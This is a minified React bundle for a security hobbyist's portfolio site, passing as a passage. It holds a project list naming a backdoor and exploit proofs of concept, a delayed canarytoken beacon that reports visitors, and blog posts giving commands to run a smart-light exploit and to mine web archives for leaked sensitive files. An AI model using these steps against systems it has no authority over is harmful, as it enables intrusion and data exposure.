Promise(function(e,t){o.onload=e,o.onerror=t}),Pd(a,`link`,r),n.instance=a}e.stylesheets===null&&(e.stylesheets=new Map),e.stylesheets.set(n,t),(t=n.state.preload)&&!(n.state.loading&3)&&(e.count++,n=Jf.bind(e),t.addEventListener(`load`,n),t.addEventListener(`error`,n))}}var Kf=0;function qf(e,t){return e.stylesheets&&e.count===0&&Xf(e,e.stylesheets),0<e.count||0<e.imgCount?function(n){var r=setTimeout(function(){if(e.stylesheets&&Xf(e,e.stylesheets),e.unsuspend){var t=e.unsuspend;e.unsuspend=null,t()}},6e4+t);0<e.imgBytes&&Kf===0&&(Kf=62500*Ld());var i=setTimeout(function(){if(e.waitingForImages=!1,e.count===0&&(e.stylesheets&&Xf(e,e.stylesheets),e.unsuspend)){var t=e.unsuspend;e.unsuspend=null,t()}},(e.imgBytes>Kf?50:800)+t);return e.unsuspend=n,function(){e.unsuspend=null,clearTimeout(r),clearTimeout(i)}}:null}function Jf(){if(this.count--,this.count===0&&(this.imgCount===0||!this.waitingForImages)){if(this.stylesheets)Xf(this,this.stylesheets);else if(this.unsuspend){var e=this.unsuspend;this.unsuspend=null,e()}}}var Yf=null;function Xf(e,t){e.stylesheets=null,e.unsuspend!==null&&(e.count++,Yf=new Map,t.forEach(Zf,e),Yf=null,Jf.call(e))}function Zf(e,t){if(!(t.state.loading&4)){var n=Yf.get(e);if(n)var r=n.get(null);else{n=new Map,Yf.set(e,n);for(var i=e.querySelectorAll(`link[data-precedence],style[data-precedence]`),a=0;a<i.length;a++){var o=i[a];(o.nodeName===`LINK`||o.getAttribute(`media`)!==`not all`)&&(n.set(o.dataset.precedence,o),r=o)}r&&n.set(null,r)}i=t.instance,o=i.getAttribute(`data-precedence`),a=n.get(o)||r,a===r&&n.set(null,i),n.set(o,i),this.count++,r=Jf.bind(this),i.addEventListener(`load`,r),i.addEventListener(`error`,r),a?a.parentNode.insertBefore(i,a.nextSibling):(e=e.nodeType===9?e.head:e,e.insertBefore(i,e.firstChild)),t.state.loading|=4}}var Qf={$$typeof:S,Provider:null,Consumer:null,_currentValue:le,_currentValue2:le,_threadCount:0};function $f(e,t,n,r,i,a,o,s,c){this.tag=1,this.containerInfo=e,this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.next=this.pendingContext=this.context=this.cancelPendingCommit=null,this.callbackPriority=0,this.expirationTimes=tt(-1),this.entangledLanes=this.shellSuspendCounter=this.errorRecoveryDisabledLanes=this.expiredLanes=this.warmLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=tt(0),this.hiddenUpdates=tt(null),this.identifierPrefix=r,this.onUncaughtError=i,this.onCaughtError=a,this.onRecoverableError=o,this.pooledCache=null,this.pooledCacheLanes=0,this.formState=c,this.incompleteTransitions=new Map}function ep(e,t,n,r,i,a,o,s,c,l,u,d){return e=new $f(e,t,n,o,c,l,u,d,s),t=1,!0===a&&(t|=24),a=fi(3,null,null,t),e.current=a,a.stateNode=e,t=da(),t.refCount++,e.pooledCache=t,t.refCount++,a.memoizedState={element:r,isDehydrated:n,cache:t},Wa(a),e}function tp(e){return e?(e=ui,e):ui}function np(e,t,n,r,i,a){i=tp(i),r.context===null?r.context=i:r.pendingContext=i,r=Ka(t),r.payload={element:n},a=a===void 0?null:a,a!==null&&(r.callback=a),n=qa(e,r,t),n!==null&&(hu(n,e,t),Ja(n,e,t))}function rp(e,t){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var n=e.retryLane;e.retryLane=n!==0&&n<t?n:t}}function ip(e,t){rp(e,t),(e=e.alternate)&&rp(e,t)}function ap(e){if(e.tag===13||e.tag===31){var t=si(e,67108864);t!==null&&hu(t,e,67108864),ip(e,67108864)}}function op(e){if(e.tag===13||e.tag===31){var t=pu();t=st(t);var n=si(e,t);n!==null&&hu(n,e,t),ip(e,t)}}var sp=!0;function cp(e,t,n,r){var i=D.T;D.T=null;var a=O.p;try{O.p=2,up(e,t,n,r)}finally{O.p=a,D.T=i}}function lp(e,t,n,r){var i=D.T;D.T=null;var a=O.p;try{O.p=8,up(e,t,n,r)}finally{O.p=a,D.T=i}}function up(e,t,n,r){if(sp){var i=dp(r);if(i===null)wd(e,t,r,fp,n),Cp(e,r);else if(Tp(i,e,t,n,r))r.stopPropagation();else if(Cp(e,r),t&4&&-1<Sp.indexOf(e)){for(;i!==null;){var a=xt(i);if(a!==null)switch(a.tag){case 3:if(a=a.stateNode,a.current.memoizedState.isDehydrated){var o=Xe(a.pendingLanes);if(o!==0){var s=a;for(s.pendingLanes|=2,s.entangledLanes|=2;o;){var c=1<<31-Ue(o);s.entanglements[1]|=c,o&=~c}rd(a),!(W&6)&&(ru=je()+500,id(0,!1))}}break;case 31:case 13:s=si(a,2),s!==null&&hu(s,a,2),bu(),ip(a,2)}if(a=dp(r),a===null&&wd(e,t,r,fp,n),a===i)break;i=a}i!==null&&r.stopPropagation()}else wd(e,t,r,null,n)}}function dp(e){return e=sn(e),pp(e)}var fp=null;function pp(e){if(fp=null,e=bt(e),e!==null){var t=o(e);if(t===null)e=null;else{var n=t.tag;if(n===13){if(e=s(t),e!==null)return e;e=null}else if(n===31){if(e=c(t),e!==null)return e;e=null}else if(n===3){if(t.stateNode.current.memoizedState.isDehydrated)return t.tag===3?t.stateNode.containerInfo:null;e=null}else t!==e&&(e=null)}}return fp=e,null}function mp(e){switch(e){case`beforetoggle`:case`cancel`:case`click`:case`close`:case`contextmenu`:case`copy`:case`cut`:case`auxclick`:case`dblclick`:case`dragend`:case`dragstart`:case`drop`:case`focusin`:case`focusout`:case`input`:case`invalid`:case`keydown`:case`keypress`:case`keyup`:case`mousedown`:case`mouseup`:case`paste`:case`pause`:case`play`:case`pointercancel`:case`pointerdown`:case`pointerup`:case`ratechange`:case`reset`:case`resize`:case`seeked`:case`submit`:case`toggle`:case`touchcancel`:case`touchend`:case`touchstart`:case`volumechange`:case`change`:case`selectionchange`:case`textInput`:case`compositionstart`:case`compositionend`:case`compositionupdate`:case`beforeblur`:case`afterblur`:case`beforeinput`:case`blur`:case`fullscreenchange`:case`focus`:case`hashchange`:case`popstate`:case`select`:case`selectstart`:return 2;case`drag`:case`dragenter`:case`dragexit`:case`dragleave`:case`dragover`:case`mousemove`:case`mouseout`:case`mouseover`:case`pointermove`:case`pointerout`:case`pointerover`:case`scroll`:case`touchmove`:case`wheel`:case`mouseenter`:case`mouseleave`:case`pointerenter`:case`pointerleave`:return 8;case`message`:switch(Me()){case Ne:return 2;case Pe:return 8;case Fe:case Ie:return 32;case Le:return 268435456;default:return 32}default:return 32}}var hp=!1,gp=null,_p=null,vp=null,yp=new Map,bp=new Map,xp=[],Sp=`mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset`.split(` `);function Cp(e,t){switch(e){case`focusin`:case`focusout`:gp=null;break;case`dragenter`:case`dragleave`:_p=null;break;case`mouseover`:case`mouseout`:vp=null;break;case`pointerover`:case`pointerout`:yp.delete(t.pointerId);break;case`gotpointercapture`:case`lostpointercapture`:bp.delete(t.pointerId)}}function wp(e,t,n,r,i,a){return e===null||e.nativeEvent!==a?(e={blockedOn:t,domEventName:n,eventSystemFlags:r,nativeEvent:a,targetContainers:[i]},t!==null&&(t=xt(t),t!==null&&ap(t)),e):(e.eventSystemFlags|=r,t=e.targetContainers,i!==null&&t.indexOf(i)===-1&&t.push(i),e)}function Tp(e,t,n,r,i){switch(t){case`focusin`:return gp=wp(gp,e,t,n,r,i),!0;case`dragenter`:return _p=wp(_p,e,t,n,r,i),!0;case`mouseover`:return vp=wp(vp,e,t,n,r,i),!0;case`pointerover`:var a=i.pointerId;return yp.set(a,wp(yp.get(a)||null,e,t,n,r,i)),!0;case`gotpointercapture`:return a=i.pointerId,bp.set(a,wp(bp.get(a)||null,e,t,n,r,i)),!0}return!1}function Ep(e){var t=bt(e.target);if(t!==null){var n=o(t);if(n!==null){if(t=n.tag,t===13){if(t=s(n),t!==null){e.blockedOn=t,ut(e.priority,function(){op(n)});return}}else if(t===31){if(t=c(n),t!==null){e.blockedOn=t,ut(e.priority,function(){op(n)});return}}else if(t===3&&n.stateNode.current.memoizedState.isDehydrated){e.blockedOn=n.tag===3?n.stateNode.containerInfo:null;return}}}e.blockedOn=null}function Dp(e){if(e.blockedOn!==null)return!1;for(var t=e.targetContainers;0<t.length;){var n=dp(e.nativeEvent);if(n===null){n=e.nativeEvent;var r=new n.constructor(n.type,n);on=r,n.target.dispatchEvent(r),on=null}else return t=xt(n),t!==null&&ap(t),e.blockedOn=n,!1;t.shift()}return!0}function Op(e,t,n){Dp(e)&&n.delete(t)}function kp(){hp=!1,gp!==null&&Dp(gp)&&(gp=null),_p!==null&&Dp(_p)&&(_p=null),vp!==null&&Dp(vp)&&(vp=null),yp.forEach(Op),bp.forEach(Op)}function Ap(e,n){e.blockedOn===n&&(e.blockedOn=null,hp||(hp=!0,t.unstable_scheduleCallback(t.unstable_NormalPriority,kp)))}var jp=null;function Mp(e){jp!==e&&(jp=e,t.unstable_scheduleCallback(t.unstable_NormalPriority,function(){jp===e&&(jp=null);for(var t=0;t<e.length;t+=3){var n=e[t],r=e[t+1],i=e[t+2];if(typeof r!=`function`){if(pp(r||n)===null)continue;break}var a=xt(n);a!==null&&(e.splice(t,3),t-=3,ws(a,{pending:!0,data:i,method:n.method,action:r},r,i))}}))}function Np(e){function t(t){return Ap(t,e)}gp!==null&&Ap(gp,e),_p!==null&&Ap(_p,e),vp!==null&&Ap(vp,e),yp.forEach(t),bp.forEach(t);for(var n=0;n<xp.length;n++){var r=xp[n];r.blockedOn===e&&(r.blockedOn=null)}for(;0<xp.length&&(n=xp[0],n.blockedOn===null);)Ep(n),n.blockedOn===null&&xp.shift();if(n=(e.ownerDocument||e).$$reactFormReplay,n!=null)for(r=0;r<n.length;r+=3){var i=n[r],a=n[r+1],o=i[ft]||null;if(typeof a==`function`)o||Mp(n);else if(o){var s=null;if(a&&a.hasAttribute(`formAction`)){if(i=a,o=a[ft]||null)s=o.formAction;else if(pp(i)!==null)continue}else s=o.action;typeof s==`function`?n[r+1]=s:(n.splice(r,3),r-=3),Mp(n)}}}function Pp(){function e(e){e.canIntercept&&e.info===`react-transition`&&e.intercept({handler:function(){return new Promise(function(e){return i=e})},focusReset:`manual`,scroll:`manual`})}function t(){i!==null&&(i(),i=null),r||setTimeout(n,20)}function n(){if(!r&&!navigation.transition){var e=navigation.currentEntry;e&&e.url!=null&&navigation.navigate(e.url,{state:e.getState(),info:`react-transition`,history:`replace`})}}if(typeof navigation==`object`){var r=!1,i=null;return navigation.addEventListener(`navigate`,e),navigation.addEventListener(`navigatesuccess`,t),navigation.addEventListener(`navigateerror`,t),setTimeout(n,100),function(){r=!0,navigation.removeEventListener(`navigate`,e),navigation.removeEventListener(`navigatesuccess`,t),navigation.removeEventListener(`navigateerror`,t),i!==null&&(i(),i=null)}}}function Fp(e){this._internalRoot=e}Ip.prototype.render=Fp.prototype.render=function(e){var t=this._internalRoot;if(t===null)throw Error(i(409));var n=t.current;np(n,pu(),e,t,null,null)},Ip.prototype.unmount=Fp.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var t=e.containerInfo;np(e.current,2,null,e,null,null),bu(),t[pt]=null}};function Ip(e){this._internalRoot=e}Ip.prototype.unstable_scheduleHydration=function(e){if(e){var t=lt();e={blockedOn:null,target:e,priority:t};for(var n=0;n<xp.length&&t!==0&&t<xp[n].priority;n++);xp.splice(n,0,e),n===0&&Ep(e)}};var Lp=n.version;if(Lp!==`19.2.8`)throw Error(i(527,Lp,`19.2.8`));O.findDOMNode=function(e){var t=e._reactInternals;if(t===void 0)throw typeof e.render==`function`?Error(i(188)):(e=Object.keys(e).join(`,`),Error(i(268,e)));return e=u(t),e=e===null?null:f(e),e=e===null?null:e.stateNode,e};var Rp={bundleType:0,version:`19.2.8`,rendererPackageName:`react-dom`,currentDispatcherRef:D,reconcilerVersion:`19.2.8`};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<`u`){var zp=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!zp.isDisabled&&zp.supportsFiber)try{Be=zp.inject(Rp),Ve=zp}catch{}}e.createRoot=function(e,t){if(!a(e))throw Error(i(299));var n=!1,r=``,o=qs,s=Js,c=Ys;return t!=null&&(!0===t.unstable_strictMode&&(n=!0),t.identifierPrefix!==void 0&&(r=t.identifierPrefix),t.onUncaughtError!==void 0&&(o=t.onUncaughtError),t.onCaughtError!==void 0&&(s=t.onCaughtError),t.onRecoverableError!==void 0&&(c=t.onRecoverableError)),t=ep(e,1,!1,null,null,n,r,null,o,s,c,Pp),e[pt]=t.current,Sd(e),new Fp(t)}})),_=o(((e,t)=>{function n(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>`u`||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!=`function`))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(n)}catch(e){console.error(e)}}n(),t.exports=g()})),v=l(d(),1),y=_(),b=o((e=>{var t=Symbol.for(`react.transitional.element`),n=Symbol.for(`react.fragment`);function r(e,n,r){var i=null;if(r!==void 0&&(i=``+r),n.key!==void 0&&(i=``+n.key),`key`in n)for(var a in r={},n)a!==`key`&&(r[a]=n[a]);else r=n;return n=r.ref,{$$typeof:t,type:e,key:i,ref:n===void 0?null:n,props:r}}e.Fragment=n,e.jsx=r,e.jsxs=r})),x=o(((e,t)=>{t.exports=b()}))();function ee({version:e}){let[t,n]=(0,v.useState)(0),[r,i]=(0,v.useState)(window.innerHeight/2),a=Math.round(window.innerHeight/2),o=Math.round(window.innerWidth),s=window.innerHeight*2/a;return(0,v.useEffect)(()=>{let e=e=>{i(e.clientY)};return window.addEventListener(`mousemove`,e),()=>{window.removeEventListener(`mousemove`,e)}},[]),(0,v.useEffect)(()=>{setTimeout(()=>{n(t+1)},50)},[t]),(0,x.jsx)(`div`,{className:`fixed z-[-5]`,children:[...Array(a)].map((n,i)=>{let c=0;c=e==1?Math.log2(Math.sin(i/a*Math.PI)+1)*250+Math.sin(i*100+t/20)*(o/3)/5+o/35:-Math.log2(Math.sin(i/a*Math.PI)+1)*250+-Math.sin(i*1+t/50)*(o/3)+window.innerWidth*1.25;let l=i*.6-15;return(0,x.jsx)(`div`,{className:`z-[-5] h-[10px] w-[12px] fixed [clip-path:polygon(25%_0%,75%_0%,100%_50%,75%_100%,25%_100%,0%_50%)]`,style:{scale:`${innerWidth/400}`,opacity:`${Math.sin(i*1+t/50+Math.PI/2.5)}`,top:`${l*s}px`,left:`${c}px`,backgroundColor:`rgba(80,${255*(1-Math.sqrt(Math.abs(r**2-(l*s)**2))/300)},255,1)`}},i)})},t)}function S(){let e={sharp:(0,x.jsx)(`img`,{src:`/images/sharp.png`,width:40}),net:(0,x.jsx)(`img`,{src:`/images/net.png`,width:40}),react:(0,x.jsx)(`img`,{src:`/images/react.png`,width:32}),docker:(0,x.jsx)(`img`,{src:`/images/docker.png`,width:36}),go:(0,x.jsx)(`img`,{className:`mt-2`,src:`/images/go.png`,width:40}),gin:(0,x.jsx)(`img`,{src:`/images/gin.png`,width:24}),avalonia:(0,x.jsx)(`img`,{src:`/images/avalonia.png`,width:28}),python:(0,x.jsx)(`img`,{src:`/images/python.png`,width:32}),blazor:(0,x.jsx)(`img`,{src:`/images/blazor.png`,width:30}),wails:(0,x.jsx)(`img`,{src:`/images/wails.png`,width:40}),nextjs:(0,x.jsx)(`img`,{src:`/images/nextjs.png`,width:30}),html:(0,x.jsx)(`img`,{className:`mx-1 mt-2`,src:`/images/html.png`,width:28}),gnuradio:(0,x.jsx)(`img`,{className:`mx-1`,src:`/images/gnuradio.png`,width:120}),flask:(0,x.jsx)(`img`,{src:`/images/flask.png`,width:40})},t=[{link:`https://github.com/varppi/PerSense`,image:``,year:2026,techs:`sharp,net`,desc:`An extremely bare bones, but reliable CCTV program with motion detecting and recording capability.`},{link:`https://github.com/varppi/PoirotRF`,image:``,year:2026,techs:`python,flask,numpy,react`,desc:`Web based signal analyzer to facilitate the rapid identification of unknown signals.`},{link:`https://github.com/varppi/OmegaRF`,image:``,year:2026,techs:`python,gnuradio`,desc:`Uses AI to identify radio signal type (WFM, TETRA, HDMI interference etc).`},{link:`https://github.com/varppi/Bleak`,image:`https://github.com/user-attachments/assets/eb66bd40-1702-4a91-95a6-0a958bcfa6dc`,year:2026,techs:`sharp,net`,desc:`Self hostable file archival site.`},{link:`https://github.com/varppi/confidoc`,image:`https://github.com/user-attachments/assets/f553bb89-5e84-489d-b895-450864c98d8c`,year:2026,techs:`sharp,net,react,docker`,desc:`Secure document management service.`},{link:`https://github.com/varppi/intelpad`,year:2026,techs:`sharp,net,blazor`,desc:`Online collaborative notepad with programmable macros.`},{link:`https://github.com/varppi/bluebox`,image:`https://github.com/user-attachments/assets/91b09535-1171-41c1-9c8b-680cf375360f`,year:2025,techs:`nextjs,react`,desc:`File hosting service, which doesn't collect PII.`},{link:`https://github.com/varppi/amnesiabox`,year:2025,techs:`go,gin`,desc:`An easy drag and drop static website hosting site.`},{link:`https://github.com/varppi/Gusecra`,year:2025,techs:`sharp,avalonia`,desc:`Encryption wrapper for FlDigi radio program.`},{link:`https://github.com/varppi/CrowbarForum`,image:`https://github.com/user-attachments/assets/f5c5e69a-d678-428b-9778-b86ee318b2d3`,year:2025,techs:`sharp,net,docker`,desc:`A forum software written in C#, that doesn't use any JS.`},{link:`https://github.com/varppi/LiteCanary`,image:`https://github.com/user-attachments/assets/b1d995db-9fdc-4782-bbdd-5f2b07a05f49`,year:2025,techs:`go,gin`,desc:`Self hostable canary server to catch intruders.`},{link:`https://github.com/varppi/SSVC`,image:`https://github.com/user-attachments/assets/c199a355-a3a8-4e58-b3ef-f264a64eb18f`,year:2025,techs:`sharp,avalonia`,desc:`Secure voice changer to prevent voice recognition.`},{link:`https://github.com/varppi/Jupitersearch`,image:`https://github.com/Varppi/JupiterSearch/assets/72181445/df7259fc-862f-4c47-848a-b53edf473c31`,year:2024,techs:`go,gin,docker`,desc:`A distributed text search database written in Go.`},{link:`https://github.com/varppi/CloakCrypt`,image:`https://github.com/user-attachments/assets/0bbc4877-7d9c-49f3-8253-15f1c87bd422`,year:2024,techs:`go,react,wails`,desc:`Program to hide encrypted containers in other files.`},{link:`https://github.com/varppi/Bucketdump`,image:`https://github.com/Varppi/BucketDump/assets/72181445/d005bad0-1cd7-4dc3-af6b-cf62e6210590`,year:2023,techs:`go`,desc:`AWS S3 bucket dumping tool.`},{link:`https://github.com/varppi/GoRamQ`,image:`https://github.com/Varppi/goramq/blob/main/images/goramq.png?raw=true`,year:2023,techs:`go`,desc:`In-memory text search program that comes with a Rest API.`},{link:`https://github.com/varppi/awacs-scanner`,image:`https://user-images.githubusercontent.com/72181445/175283893-5f86ae86-36d0-4b3b-a8b7-6c99b7b1dfa1.png`,year:2022,techs:`python`,desc:`Now looking back, a finicky vulnerability and port scanner.`},{link:`https://github.com/varppi/dnsnet`,image:`https://user-images.githubusercontent.com/72181445/155982020-2db1333f-74b7-4c3f-8178-f14a75a0a65d.png`,year:2022,techs:`python`,desc:`Encrypted backdoor that masks itself as DNS traffic.`},{link:`https://github.com/varppi/wiz_exploit`,year:2021,techs:`python`,desc:`A proof of concept remote exploit for Wiz brand smart lights.`},{link:`https://github.com/varppi/cve-2012-2982`,year:2021,techs:`python`,desc:`A proof of concept RCE exploit for Webmin.`}];return[...Array(100).keys()].map(n=>t.filter(e=>2100-e.year==n).length==0?(0,x.jsx)(x.Fragment,{}):(0,x.jsx)(`div`,{className:`flex flex-col w-full items-center`,children:(0,x.jsxs)(`div`,{className:`w-full pe-5 ps-2`,children:[(0,x.jsx)(`p`,{className:`snap-start text-3xl mt-[2vh] uppercase`,children:2100-n}),t.filter(e=>2100-e.year==n).map(t=>(0,x.jsx)(`div`,{className:`z-[0] p-3 w-full`,children:(0,x.jsx)(`div`,{className:`flex justify-between`,children:(0,x.jsxs)(`div`,{className:`w-full border border-white/10 p-2 flex flex-col items-start min-md:grid min-md:grid-cols-[22%_58%_20%] min-md:flex items-center`,children:[(0,x.jsx)(`div`,{className:`flex gap-2`,children:(0,x.jsx)(`p`,{className:`text-2xl underline mb-2 uppercase`,children:(0,x.jsx)(`a`,{href:t.link,children:t.link.split(`/`).at(-1)})})}),(0,x.jsx)(`p`,{className:`mb-1 font-semibold`,children:t.desc}),(0,x.jsx)(`div`,{className:`flex items-center gap-2 p-1 w-fit  h-[50px] filter-[brightness(100%)_contrast(0%)_brightness(10000%)]`,children:t.techs.split(`,`).map(t=>e[t])})]})})}))]})}))}function C(){let[e,t]=(0,v.useState)(``);return(0,v.useEffect)(()=>{setTimeout(()=>{t(`http://canarytokens.com/tags/about/l0x2bgu9wk0ew3vyh1ift67v6/photo1.jpg`)},1e4)},[]),(0,x.jsxs)(x.Fragment,{children:[(0,x.jsx)(ee,{version:1}),(0,x.jsxs)(`main`,{children:[(0,x.jsxs)(`section`,{className:`flex flex-col items-center mt-5 min-md:pt-[10vh]`,children:[(0,x.jsx)(`h1`,{className:`min-md:hidden text-center text-4xl font-bold mt-[7vh] mb-[7.5vh] z-[5]`,children:`Welcome to my portfolio`}),(0,x.jsxs)(`div`,{className:`max-w-[1000px] w-full z-[5]`,children:[(0,x.jsx)(`div`,{className:`flex max-md:ps-5 min-md:justify-center mb-[5vh]`,children:(0,x.jsxs)(`div`,{className:`flex gap-5 text-[calc(20px_+_0.5vw)] font-bold max-md:flex-col uppercase`,children:[(0,x.jsx)(`span`,{className:`max-md:border-s-3 max-md:ps-3`,children:`Finland`}),(0,x.jsx)(`div`,{className:`border max-md:hidden`}),(0,x.jsx)(`span`,{className:`max-md:border-s-3 max-md:ps-3`,children:`varppi@proton.me`}),(0,x.jsx)(`div`,{className:`border max-md:hidden`}),(0,x.jsx)(`a`,{className:`max-md:border-s-3 max-md:ps-3 underline`,href:`https://github.com/varppi`,children:`Github`}),(0,x.jsx)(`div`,{className:`border max-md:hidden`}),(0,x.jsx)(`a`,{className:`max-md:border-s-3 max-md:ps-3 underline`,href:`/blog`,children:`My Blog`})]})}),(0,x.jsx)(`hr`,{className:`border-white/10 mb-2 mt-2`}),(0,x.jsxs)(`div`,{className:`text-[calc(15px_+_0.4vw)] px-2 mt-[7vh] darken-normal`,children:[(0,x.jsx)(`b`,{className:`uppercase`,children:`Experience:`}),(0,x.jsxs)(`ul`,{className:`list-disc ms-5 flex flex-col gap-5 mt-2`,children:[(0,x.jsxs)(`li`,{children:[`Software development with `,(0,x.jsx)(`b`,{children:`C#, Go, Python`})]}),(0,x.jsxs)(`li`,{children:[`Web development with mainly `,(0,x.jsx)(`b`,{children:`ASP.NET`}),` and `,(0,x.jsx)(`b`,{children:`React`})]}),(0,x.jsxs)(`li`,{children:[(0,x.jsx)(`b`,{children:`Digital Signal Processing (DSP)`}),` with `,(0,x.jsx)(`b`,{children:`Python`}),` (`,(0,x.jsx)(`b`,{children:`NumPy`}),`, `,(0,x.jsx)(`b`,{children:`SciPy`}),`)`]}),(0,x.jsx)(`span`,{className:`relative bottom-5 italic text-sm mb-[-40px]`,children:`Related private projects (scroll down for public ones)`}),(0,x.jsxs)(`ul`,{className:`list-disc ms-5 gap-1 flex flex-col`,children:[(0,x.jsx)(`li`,{className:`text-[15px]`,children:`DOPPLER and FMCW radar (ADALM pluto based board)`}),(0,x.jsx)(`li`,{className:`text-[15px]`,children:`Automated radio direction finding system, which uses phase correlation`}),(0,x.jsx)(`li`,{className:`text-[15px]`,children:`Webcam USB cable EMI analyzer`}),(0,x.jsx)(`li`,{className:`text-[15px]`,children:`LTE uplink detector & device amount approximator`})]}),(0,x.jsxs)(`li`,{children:[`Web and mobile `,(0,x.jsx)(`b`,{children:`penetration testing`})]}),(0,x.jsx)(`span`,{className:`relative bottom-5 italic text-sm mb-[-40px]`,children:`Related private projects (scroll down for public ones)`}),(0,x.jsxs)(`ul`,{className:`list-disc ms-5 gap-1 flex flex-col`,children:[(0,x.jsx)(`li`,{className:`text-[15px]`,children:`A few responsible disclosure bug reports`}),(0,x.jsx)(`li`,{className:`text-[15px]`,children:`Grinded TryHackMe years ago and I am still global top 5000 (~0.007%), though I no longer use the site actively --> https://tryhackme.com/p/Varppi`})]}),(0,x.jsxs)(`li`,{children:[(0,x.jsx)(`b`,{children:`Blue teaming`}),` such as configuring network security systems (`,(0,x.jsx)(`b`,{children:`IPS/IDS`}),`), `,(0,x.jsx)(`b`,{children:`hardening`}),` operating systems and doing `,(0,x.jsx)(`b`,{children:`digital forensics`})]}),(0,x.jsx)(`span`,{className:`relative bottom-5 italic text-sm mb-[-40px]`,children:`Related private projects (scroll down for public ones)`}),(0,x.jsxs)(`ul`,{className:`list-disc ms-5 gap-1 flex flex-col`,children:[(0,x.jsx)(`li`,{className:`text-[15px]`,children:`Writing custom eBPF Linux kernel modules`}),(0,x.jsx)(`li`,{className:`text-[15px]`,children:`Configuring and using SELinux and AppArmor`}),(0,x.jsx)(`li`,{className:`text-[15px]`,children:`Homelab AD network with Wazuh XDR`}),(0,x.jsx)(`li`,{className:`text-[15px]`,children:`Imaging hard drives or SSDs from broken electronics (mainly laptops)`})]}),(0,x.jsxs)(`li`,{children:[(0,x.jsx)(`b`,{children:`OSINT`}),` and `,(0,x.jsx)(`b`,{children:`GEOINT`})]}),(0,x.jsx)(`span`,{className:`relative bottom-5 italic text-sm mb-[-40px]`,children:`Related private projects (scroll down for public ones)`}),(0,x.jsx)(`ul`,{className:`list-disc ms-5 gap-1 flex flex-col`,children:(0,x.jsx)(`li`,{className:`text-[15px]`,children:`Custom spacial imagery object recognition script to find things such as cranes/dams/military transport vehicles from millions of public low res satellite images.`})})]}),(0,x.jsx)(`hr`,{className:`border-white/10 mb-2 mt-[5vh]`}),`The above list is not fully representative of my skill set, because I have delved into many areas of tech. In short, I am interested in almost everything that has something to do with `,(0,x.jsx)(`b`,{children:`information security`}),`, `,(0,x.jsx)(`b`,{children:`data science`}),`, or `,(0,x.jsx)(`b`,{children:`digital sovereignty`}),`.`,(0,x.jsx)(`br`,{className:`mb-5`}),`I started coding back in `,(0,x.jsx)(`b`,{className:`text-2xl`,children:`2018`}),` and have been doing tech-related things almost every day since then, but I only properly got around to posting them online in 2022.`,(0,x.jsxs)(`div`,{className:`flex w-full mt-[5vh] gap-2`,children:[(0,x.jsx)(`a`,{className:`bg-white text-black uppercase font-bold w-[50%] p-2 text-center`,target:`_blank`,href:`https://github.com/varppi`,children:`Github`}),(0,x.jsx)(`a`,{className:`bg-white text-black uppercase font-bold w-[50%] p-2 text-center`,target:`_blank`,href:`/blog`,children:`Blog`})]})]})]}),(0,x.jsx)(`div`,{className:`max-w-[1000px] w-full mt-[5vh] mb-[5vh] z-[5]`,children:(0,x.jsx)(S,{})})]}),(0,x.jsx)(`div`,{children:(0,x.jsx)(`img`,{src:e})})]})]})}var w=`Exploiting wiz smart lights
===========================

![Very high quality video of me exploiting this vulnerability (command was “python3 wiz-hack.py 192.168.12.238 on")](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*f4uE9PTFErM9I3TqFzqZpQ.gif)


**Origin story**
----------------



One day I was really bored and decided to figure out how my smart lights worked so I ARP spoofed the connection between my phone and the lights. Then I just started changing the settings and after that I replicated the packets my phone sent in Python and wouldn’t you know, it worked!

### How to exploit

To exploit this vulnerability we need **network level access** to the lights and the POC script.

1.  Download POC script from https://github.com/Varppi/wiz_exploit
2.  Extract the program to a directory
3.  Cd into the directory
4.  Run this command (change the IP and subcommand):

\`\`\`
python3 wiz-hack.py <the lights ip here> <command>
\`\`\`

### Here are some examples:

**Turn lights on:**

\`\`\`
python3 wiz-hack.py <the lights ip here> on
\`\`\`

**Turn lights blue:**

\`\`\`
python3 wiz-hack.py <the lights ip here> 0 0 255
\`\`\`

**_Remember! IOT = Internet Of Trash_**
---------------------------------------`,T=`Bringing back sensitive files from web archives
===============================================

![vulnweb sites are meant to be hacked](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XYfD-mt5VlRM03FeRS6ngQ.png)


Technical details
-----------------





We’re going to use a tool called sigurlfind3r to go through archived urls (via the Wayback Machine) and try to find sensitive files in them, for example. db,.sqllite3,.bak etc… then we’re going to use Wayback Machine to read the file and potentially discover some leaked data. Although the data is old, companies may not reset passwords or pin codes on a yearly basis, and if the data contains things like addresses or phone numbers, they are destined to still be valid.

### Attack!

First we need to install the tool so you can just copy these lines

\`\`\`
git clone https://github.com/signedsecurity/sigurlfind3r.git && \\
cd sigurlfind3r/cmd/sigurlfind3r/ && \\
go build; mv sigurlfind3r /usr/local/bin/ && \\
\`\`\`

Now let’s get started with the basic usage. First we provide the domain with -d then we tell it to **include** all the subdomains using -iS.

\`sigurlfind3r -d nonexistantdomain.domain -iS\`

Now that we know how to list the urls we need to make it quiet so that there are no ascii logos, anything except the urls. For this, we can use the **-s** flag.

\`sigurlfind3r -d nonexistantdomain.domain -iS -s\`

With the silent output, we can now start parsing the urls. Download an extensions wordlist from github: [https://github.com/oppsec/extensions-wordlist](https://github.com/oppsec/extensions-wordlist) (we’re gonna use the general.txt one). To parse those we need to use grep or a tool of your choice. Because grep treats dots like a wildcard for “any character” we need to put \\ in front of them with sed:

\`cat general.txt |sed ‘s/^/\\/g’ > general2.txt\`

Now that we have 1. the tools 2. the wordlist, we can parse through the urls. Here’s the full command to parse trough the URLs.

\`sigurlfind3r -d nonexistantdomain.domain -iS -s |grep -f general2.txt\`

And now if the domain you scanned or its subdomains had any files with the extensions provided in general2.txt you should see something like this:

